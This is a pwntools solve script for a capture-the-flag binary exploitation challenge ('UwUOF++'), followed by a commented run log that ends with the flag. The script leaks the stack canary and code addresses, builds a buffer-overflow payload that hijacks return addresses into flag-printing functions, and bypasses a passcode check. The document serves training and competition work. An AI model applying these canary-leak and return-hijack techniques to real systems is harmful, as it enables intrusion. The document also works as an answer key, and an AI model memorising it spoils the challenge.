from pwn import * 
import os 

  # This shows the ./program process PID
 # If you're using tmux
# context.terminal = ['gnome-terminal', '--'] # If you're using gnome-terminal

p = process("./program")
#p = remote("chal.firebird.sh", 35020)

print(f"[*] Python script PID: {os.getpid()}")
print(f"[*] Binary PID: {p.pid}")

p.recvuntil(b"you are in ")
UwU_main_addr = int(p.recvuntil(b" ").strip(), 16)
print("[*] UwU_main address:", hex(UwU_main_addr))
# Get output until the UwU location is printed
p.recvuntil(b"UwU is in ")
uwu_addr = int(p.recvuntil(b"\n").strip(), 16)  # This will get 0x7fff4a896940 as int
print("[*] UwU address:", hex(uwu_addr))

# Calculate rbp address (UwU is at rbp-0x70)

rbp_addr = uwu_addr + 0x70
print("[*] RBP address:", hex(rbp_addr))

UwU_main_offset = 0xe27
know_more_offset = 0xd97
main_offset = 0xfaf
UwU_flag_offset = 0xc60
know_more_addr = UwU_main_addr - UwU_main_offset + know_more_offset
main_addr = UwU_main_addr - UwU_main_offset + main_offset
UwU_flag_addr = UwU_main_addr - UwU_main_offset + UwU_flag_offset

print("[*] main address:", hex(main_addr))
passcode_addr = main_addr - 0xfaf + 0x104a + 0x2010a2

# Now we can continue with the rest of the exploit
p.recvuntil(b"Please enter a choice (1:Yes, 2:Yes):")
p.sendline(b'1')

# ... rest of your exploit
p.recvuntil(b"Please enter an address e.g. 0x7fffdeadbeef:")
canary_location = hex(rbp_addr - 8)
p.sendline(canary_location)
p.recvuntil(b"contains ")
leaked_canary = int(p.recvuntil(b"\n").strip(), 16)
print("[*] leaked canary:", hex(leaked_canary))
payload = b'UwUUwU'+ b'A' * 82 # 88 bytes to get to canary
payload += p64(leaked_canary) # replace with variable that stores it
payload += b'A' * 8 # goes to return address 
payload += p64(know_more_addr)
payload += p64(UwU_flag_addr)
payload += b'1' * 8 # padding between deadbeef and rbp 
payload += b'2' * 8 # padding between deadbeef and rbp 
payload += p64(0xdeadbeef)
payload += b'3' * 8 # padding between deadbeef and beefdead  
payload += b'4' * 8 # padding between deadbeef and beefdead  
payload += p64(0xbeefdead)




pause()
p.sendline(payload)
pause()
p.recvuntil(b"Please enter an address e.g. 0x7fffdeadbeef:")
p.sendline(hex(passcode_addr))
p.recvuntil(b"contains ")
leaked_passcode = int(p.recvuntil(b"\n").strip(), 16)
print("[*] leaked passcode:", hex(leaked_passcode))

# Bypassing passcode 
p.recvuntil(b"* Please enter the passcode: ")
p.sendline(str(leaked_passcode).encode())


p.interactive()



'''parse_ldd_output
┌──(kali㉿kali)-[~/Desktop/CTF/UwUOF++]
└─$ python solve.py
[+] Opening connection to chal.firebird.sh on port 35020: Done
[*] UwU_main address: 0x556920c78e27
[*] UwU address: 0x7ffc1cd566d0
[*] RBP address: 0x7ffc1cd56740
[*] main address: 0x556920c78faf
/home/kali/Desktop/CTF/UwUOF++/solve.py:45: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(canary_location)
[*] leaked canary: 0xb4782f2a66996a00
[*] Paused (press any to continue)
[*] Paused (press any to continue)
/home/kali/Desktop/CTF/UwUOF++/solve.py:69: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(hex(passcode_addr))
[*] leaked passcode: 0x122bf
[*] Switching to interactive mode
You beat me... Let me print the flag to you... ( ˘•ω•˘ )◞⁽˙³˙⁾
flag{y0u_b3a7_7h3_g0d_0f_UwU_w17h_B0F!?}
'''